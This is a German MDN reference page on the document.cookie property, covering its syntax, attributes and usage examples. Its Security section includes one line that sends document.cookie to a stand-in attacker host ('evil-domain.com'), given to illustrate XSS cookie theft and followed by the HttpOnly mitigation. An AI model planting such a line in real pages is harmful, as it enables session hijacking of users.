---
title: "Dokument: Cookie-Eigenschaft"
short-title: cookie
slug: Web/API/Document/cookie
l10n:
  sourceCommit: 4d929bb0a021c7130d5a71a4bf505bcb8070378d
---

{{APIRef("DOM")}}

Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` ermöglicht Ihnen das Lesen und Schreiben von [Cookies](/de/docs/Web/HTTP/Guides/Cookies), die mit dem Dokument verknüpft sind. Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.

## Syntax

### Alle von diesem Ort aus zugänglichen Cookies lesen

```js
allCookies = document.cookie;
```

Im obigen Code ist `allCookies` ein String, der eine durch Semikolons getrennte Liste aller Cookies (d.h. `key=value` Paare) enthält. Beachten Sie, dass jedes _key_ und _value_ von Leerzeichen (Leer- und Tabulatorzeichen) umgeben sein kann: Tatsächlich verlangt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon, aber einige User Agents halten sich möglicherweise nicht daran.

### Ein neues Cookie schreiben

```js
document.cookie = newCookie;
```

Im obigen Code ist `newCookie` ein String der Form `key=value`, der das zu setzende/aktualisierende Cookie angibt. Beachten Sie, dass Sie mit dieser Methode nur ein einzelnes Cookie gleichzeitig setzen/aktualisieren können. Berücksichtigen Sie auch, dass:

- Jeder der folgenden Cookie-Attributwerte dem Schlüssel-Wert-Paar optional folgen kann, jeweils durch einen Semikolon-Separator getrennt:

  - `;domain=domain` (z. B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird. Wenn nicht angegeben, wird standardmäßig der Hostteil des aktuellen Dokumentstandorts verwendet und das Cookie ist auf Unterdomänen nicht verfügbar. Wenn eine Domäne angegeben ist, sind Unterdomänen immer eingeschlossen. Im Gegensatz zu früheren Spezifikationen werden führende Punkte in Domänennamen ignoriert, aber Browser können sich weigern, das Cookie mit solchen Punkten zu setzen.

    > [!NOTE]
    > Die Domäne _muss_ mit der Domäne des JavaScript-Ursprungs übereinstimmen.
    > Das Setzen von Cookies auf fremde Domänen wird stillschweigend ignoriert.

  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben sind, läuft es am Ende der Sitzung ab.

    > [!WARNING]
    > Wenn der Datenschutz der Benutzer ein Anliegen ist, ist es wichtig, dass jede Webanwendung Cookie-Daten nach einer bestimmten Zeitspanne ungültig macht, anstatt sich darauf zu verlassen, dass der Browser dies tut. Viele Browser erlauben es Benutzern anzugeben, dass Cookies niemals ablaufen sollten, was nicht unbedingt sicher ist.

    Siehe {{jsxref("Date.toUTCString()")}} für Hilfe bei der Formatierung dieses Werts.

  - `;max-age=max-age-in-seconds`: Das maximale Alter des Cookies in Sekunden (z. B. `60*60*24*365` oder 31536000 für ein Jahr).

  - `;partitioned`: Gibt an, dass das Cookie in partitioniertem Speicher gespeichert werden soll. Weitere Informationen finden Sie unter [Cookies Having Independent Partitioned State (CHIPS)](/de/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies).

  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Definieren, wo Cookies gesendet werden](/de/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) für weitere Informationen).

  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}} Headers kann von einem Server gesetzt werden, um zu spezifizieren, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Steuern von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).

    - Der `lax`-Wert sendet das Cookie für alle same-site Anfragen und Top-Level-Navigations-GET-Anfragen. Dies ist ausreichend für das Benutzertracking, verhindert jedoch viele {{Glossary("CSRF", "Cross-Site Request Forgery")}} (CSRF) Angriffe. Dies ist der Standardwert in modernen Browsern.
    - Der `strict`-Wert verhindert, dass das Cookie durch den Browser an die Zielseite in allen Cross-Site-Browsing-Kontexten gesendet wird, selbst beim Folgen eines regulären Links.
    - Der `none`-Wert gibt explizit an, dass keine Einschränkungen angewendet werden. Das Cookie wird in allen Anfragen—sowohl Cross-Site als auch Same-Site gesendet.

  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden soll.

- Der Wertstring des Cookies kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht erlaubt sind).
- Einige Benutzeragenten-Implementierungen unterstützen die folgenden Cookie-Präfixe:

  - `__Secure-` Signale an den Browser, dass er das Cookie nur in Anfragen einbeziehen soll, die über einen sicheren Kanal übertragen werden.
  - `__Host-` Signale an den Browser, dass zusätzlich zur Einschränkung, das Cookie nur aus einem sicheren Ursprung zu verwenden, der Gültigkeitsbereich des Cookies durch ein vom Server übergebenes Pfad-Attribut begrenzt ist. Wenn der Server das Pfad-Attribut weglässt, wird das "Verzeichnis" der Anforderungs-URI verwendet. Es signalisiert auch, dass das Domänenattribut nicht vorhanden sein darf, was verhindert, dass das Cookie an andere Domänen gesendet wird. Für Chrome muss das Pfad-Attribut immer der Ursprung sein.

  > [!NOTE]
  > Der Bindestrich wird als Teil des Präfixes betrachtet.

  > [!NOTE]
  > Diese Flags sind nur mit dem `secure`-Attribut setzbar.

> [!NOTE]
> Wie Sie aus dem obigen Code sehen können, ist `document.cookie` eine [Accessoreigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist folglich _keine_ [Dateneigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: Was Sie schreiben, ist nicht dasselbe, was Sie lesen, alles wird immer durch den JavaScript-Interpreter vermittelt.

## Beispiele

### Beispiel 1: Einfache Verwendung

```js
// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

function showCookies() {
  const output = document.getElementById("cookies");
  output.textContent = `> ${document.cookie}`;
}

function clearOutputCookies() {
  const output = document.getElementById("cookies");
  output.textContent = "";
}
```

```html
<button onclick="showCookies()">Show cookies</button>

<button onclick="clearOutputCookies()">Clear</button>

<div>
  <code id="cookies"></code>
</div>
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### Beispiel 2: Ein Beispiel-Cookie namens test2 abrufen

```js
// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

const cookieValue = document.cookie
  .split("; ")
  .find((row) => row.startsWith("test2="))
  ?.split("=")[1];

function showCookieValue() {
  const output = document.getElementById("cookie-value");
  output.textContent = `> ${cookieValue}`;
}

function clearOutputCookieValue() {
  const output = document.getElementById("cookie-value");
  output.textContent = "";
}
```

```html
<button onclick="showCookieValue()">Show cookie value</button>

<button onclick="clearOutputCookieValue()">Clear</button>

<div>
  <code id="cookie-value"></code>
</div>
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### Beispiel 3: Etwas nur einmal tun

Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes
`doSomethingOnlyOnce` (der Name des Cookies) durch einen benutzerdefinierten Namen.

```js
function doOnce() {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    const output = document.getElementById("do-once");
    output.textContent = "> Do something here!";
  }
}

function clearOutputDoOnce() {
  const output = document.getElementById("do-once");
  output.textContent = "";
}
```

```html
<button onclick="doOnce()">Only do something once</button>

<button onclick="clearOutputDoOnce()">Clear</button>

<div>
  <code id="do-once"></code>
</div>
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### Beispiel 4: Das vorherige Cookie zurücksetzen

```js
function resetOnce() {
  // Note that we are setting `SameSite=None;` in this example because the example
  // needs to work cross-origin.
  // It is more common not to set the `SameSite` attribute, which results in the default,
  // and more secure, value of `SameSite=Lax;`
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
}

function clearOutputResetOnce() {
  const output = document.getElementById("reset-once");
  output.textContent = "";
}
```

```html
<button onclick="resetOnce()">Reset only once cookie</button>

<button onclick="clearOutputResetOnce()">Clear</button>

<div>
  <code id="reset-once"></code>
</div>
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### Beispiel 5: Existenz eines Cookies überprüfen

```js
// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "reader=1; SameSite=None; Secure";

function checkACookieExists() {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    const output = document.getElementById("a-cookie-existence");
    output.textContent = '> The cookie "reader" exists';
  }
}

function clearOutputACookieExists() {
  const output = document.getElementById("a-cookie-existence");
  output.textContent = "";
}
```

```html
<button onclick="checkACookieExists()">Check a cookie exists</button>

<button onclick="clearOutputACookieExists()">Clear</button>

<div>
  <code id="a-cookie-existence"></code>
</div>
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### Beispiel 6: Überprüfen, ob ein Cookie einen bestimmten Wert hat

```js
function checkCookieHasASpecificValue() {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    const output = document.getElementById("a-specific-value-of-the-cookie");
    output.textContent = '> The cookie "reader" has a value of "1"';
  }
}

function clearASpecificValueOfTheCookie() {
  const output = document.getElementById("a-specific-value-of-the-cookie");
  output.textContent = "";
}
```

```html
<button onclick="checkCookieHasASpecificValue()">
  Check that a cookie has a specific value
</button>

<button onclick="clearASpecificValueOfTheCookie()">Clear</button>

<div>
  <code id="a-specific-value-of-the-cookie"></code>
</div>
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## Sicherheit

Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Lesen des Cookies von einem anderen Pfad aus schützt.
Es kann leicht mit dem DOM umgangen werden, indem z. B. ein verstecktes {{HTMLElement("iframe")}}-Element mit dem Pfad des Cookies erstellt und dann auf die Eigenschaft `contentDocument.cookie` dieses Iframes zugegriffen wird.
Der einzige Weg, um das Cookie zu schützen, ist die Verwendung einer anderen Domäne oder Unterdomäne aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Same-origin_policy).

Cookies werden häufig in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren.
Das Stehlen eines Cookies von einer Webanwendung führt zur Übernahme der Sitzung des authentifizierten Benutzers.
Häufige Methoden, um Cookies zu stehlen, umfassen den Einsatz von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder die Ausnutzung einer {{Glossary("Cross-site_scripting", "Cross-Site-Scripting")}} (XSS)-Schwachstelle in der Anwendung -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem es den Zugriff auf den Cookie-Wert durch JavaScript verhindert.
Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Hinweise

- Ab Firefox 2 ist ein besserer Mechanismus für clientseitigen Speicher verfügbar - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
- Sie können ein Cookie löschen, indem Sie dessen Ablaufzeit auf null aktualisieren.
- Beachten Sie, dass je mehr Cookies Sie haben, desto mehr Daten werden zwischen dem Server und dem Client für jede Anfrage übertragen. Dies macht jede Anfrage langsamer. Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "nur-Client-Daten" speichern möchten.
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementierungslimits") spezifiziert, dass es **keine maximale Länge** der Schlüssel- oder Wertgröße eines Cookies geben sollte und ermutigt Implementationen, **beliebig große Cookies** zu unterstützen. Das Implementierungsmaximum eines jeden Browsers wird notwendigerweise unterschiedlich sein, ziehen Sie daher die individuelle Browserdokumentation zu Rate.

Der Grund für die [Syntax](#syntax) der `document.cookie` Accessoreigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen Client-Client-Speichermethoden unterscheidet (wie z. B. [localStorage](/de/docs/Web/API/Web_Storage_API)):

### Der Server weist den Client an, ein Cookie zu speichern

```bash
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: cookie_name1=cookie_value1
Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

[content of the page here]
```

### Der Client sendet dem Server die zuvor gespeicherten Cookies zurück

```bash
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
Accept: */*
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [HTTP-Cookies](/de/docs/Web/HTTP/Guides/Cookies)
- [DOM Storage](/de/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/de/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
